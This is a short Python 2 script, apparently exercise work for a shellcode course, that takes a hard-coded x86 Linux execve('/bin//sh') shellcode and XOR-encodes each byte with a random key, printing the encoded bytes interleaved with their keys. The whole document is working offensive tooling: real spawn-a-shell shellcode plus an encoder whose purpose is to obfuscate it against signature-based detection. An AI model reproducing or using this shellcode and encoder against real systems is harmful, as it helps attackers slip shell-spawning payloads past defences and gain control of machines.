#!/usr/bin/python

# Python Insertion Encoder 
import random

shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")

print 'Original Shellcode Len: %d' % len(bytearray(shellcode))

encoded = ""
decoded = ""

print 'Encoded shellcode ...'

for x in bytearray(shellcode) :
	# encoding
	rd=random.randint(1,255)
	encoded += '0x'
	enc = '%02x' % (x ^ rd)
	encoded += enc + ","
	encoded += '0x%02x,' % rd
	
	# test the decoding process
#	decoded += '\\x'
#	decoded += '%02x' % ( int(enc,base=16) ^ rd)


print encoded

#print 'Decoded shellcode ...'
#print decoded

